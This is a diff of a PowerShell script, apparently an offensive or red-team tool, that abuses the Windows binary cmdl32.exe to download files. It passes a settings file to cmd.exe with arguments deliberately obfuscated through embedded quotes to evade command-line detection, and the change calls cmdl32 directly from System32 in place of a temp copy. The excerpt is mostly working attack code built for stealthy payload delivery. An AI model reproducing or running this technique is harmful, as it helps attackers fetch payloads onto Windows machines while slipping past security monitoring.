@@ -30,26 +30,19 @@ Set-Content -Path "$tempDir\settings.txt" -Value $settingsContent
 
 Write-Host "[*] Performing download with cmdl32 via cmd.exe"
 
-# Assuming cmdl32 is in system32 or accessible, let's copy it to temp directory
-$cmdl32Path = "cmdl32"
-$cmdl32TempPath = Join-Path -Path $tempDir -ChildPath "cmdl32.exe"
+# Directly reference cmdl32 from System32
+$cmdl32Path = "C:\Windows\System32\cmdl32.exe"
 
-# Check if cmdl32 exists and copy to temp if needed
-if (!(Test-Path -Path $cmdl32TempPath)) {
-    Write-Host "[*] cmdl32.exe not found in temp directory. Copying from system32."
-    Copy-Item -Path "C:\Windows\System32\cmdl32.exe" -Destination $cmdl32TempPath
-}
-
-# Double check if cmdl32 was copied successfully
-if (!(Test-Path -Path $cmdl32TempPath)) {
-    Write-Host "[!] cmdl32.exe not found, cannot proceed with download."
+# Check if cmdl32 exists
+if (!(Test-Path -Path $cmdl32Path)) {
+    Write-Host "[!] cmdl32.exe not found in System32, cannot proceed."
     Exit
 }
 
-Write-Host "[*] Using cmdl32.exe at: $cmdl32TempPath"
+Write-Host "[*] Using cmdl32.exe at: $cmdl32Path"
 
 # Define the arguments with obfuscation using quotes within the command
-$arguments = "/c $cmdl32TempPath /v`"p`"n /l`"a`"n `"$tempDir\settings.txt`""
+$arguments = "/c $cmdl32Path /v`"p`"n /l`"a`"n `"$tempDir\settings.txt`""
 
 Write-Host "[*] Starting cmd.exe with obfuscated arguments: $arguments"
 
